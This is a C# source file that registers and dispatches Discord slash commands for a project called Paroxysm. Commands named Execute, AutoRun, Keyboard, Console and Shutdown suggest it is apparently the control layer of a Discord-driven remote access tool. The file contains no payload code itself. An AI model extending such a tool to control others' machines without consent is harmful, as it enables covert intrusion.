using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Audit;
using Paroxysm.Discord.Commands;
using Paroxysm.Discord.Commands.Models;

namespace Paroxysm.Discord;

public static class DiscordCommand
{
    public static IEnumerable<ISlashCommand> GetCommands()
    {
        return new ISlashCommand[]
        {
            new ConsoleCmd(),
            new WallpaperCmd(),
            new PingCmd(),
            new ShutdownCmd(),
            new AutoRunCmd(),
            new CursorCmd(),
            new TaskManagerCmd(),
            new WebpageCmd(),
            new ExecuteCmd(),
            new UpdateCmd(),
            new SettingsCmd(),
            new ClosewinCmd(),
            new ProgramsCmd(), 
            new HardwareCmd(),
            new DebugCmd(),
            new KeyboardCmd()
        };
    }

    public static Task OnMessageReceivedAsync(SocketMessage message)
    {
        return Task.CompletedTask;
    }

    public static async Task OnSlashCommandExecute(SocketSlashCommand slashCommand)
    {
        if (slashCommand.ChannelId != DiscordStatement.CurrentChannel.Id &&
            slashCommand.ChannelId != 1170294233656217630) return;
        
        var command = GetCommands().FirstOrDefault(cmd => cmd.Options().Name == slashCommand.CommandName);
        if (command == null)
        {
            await slashCommand.RespondAsync("Command not found", null, false, true);
        }

        Embed? result = command?.Execute(slashCommand);
        if (result == null)
        {
            // komendy zwracające null (gdyż respond został wysłany w commandAction) nie będą wysyłały wiadomości po wykonaniu komend
            return;
        }
        var commandOptions =
            slashCommand.Data.Options.Count > 0 ? slashCommand.Data.Options.ElementAt(0).Value as string : "";
        Console.ForegroundColor = ConsoleColor.DarkCyan;
        Console.WriteLine(
            $"[Executor] -> \tUser {slashCommand.User.Username} has executed command /{slashCommand.CommandName} {commandOptions}");
        Console.ResetColor();

        await slashCommand.RespondAsync(null, new[] { result }, false, true);
        await AuditManager.LogCommandMessage(new EmbedAuthorBuilder
        {
            Name = slashCommand.User.Username,
            IconUrl = slashCommand.User.GetAvatarUrl()
        }, slashCommand.CommandName, result!.Description);
    }

    public static Task SetupSlashCommands()
    {
        Array.ForEach(GetCommands().ToArray(), command =>
        {
            var properties = command.CreateSlashCommand().Build();
            DiscordStatement.DiscordClient.CreateGlobalApplicationCommandAsync(properties);
            Console.WriteLine($"\t[Setup] Command /{properties.Name} has been injected.");
        });
        
        return Task.CompletedTask;
    }
}